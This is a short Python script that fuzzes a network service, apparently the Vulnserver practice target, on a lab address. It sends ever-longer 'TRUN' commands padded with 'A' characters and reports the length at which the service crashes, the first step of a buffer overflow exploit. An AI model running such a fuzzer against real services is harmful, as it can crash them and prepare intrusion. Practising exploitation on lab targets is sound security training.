from time import sleep
import sys
import socket

noc = 100
sts = "TRUN /.:/" + "A" * noc
while True:
    try:
        baglanti = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        baglanti.connect(("192.168.1.5", 1337))
        bit = sts.encode(encoding="latin1")
        baglanti.send(bit)
        baglanti.close()

        sts = sts + "A" * 100

        sleep(1)

    except KeyboardInterrupt:
        print("Crashed at: " + str(len(sts)))
        sys.exit()
    except Exception as e:
        print("Crashed at: " + str(len(sts)))
        print(e)
        sys.exit()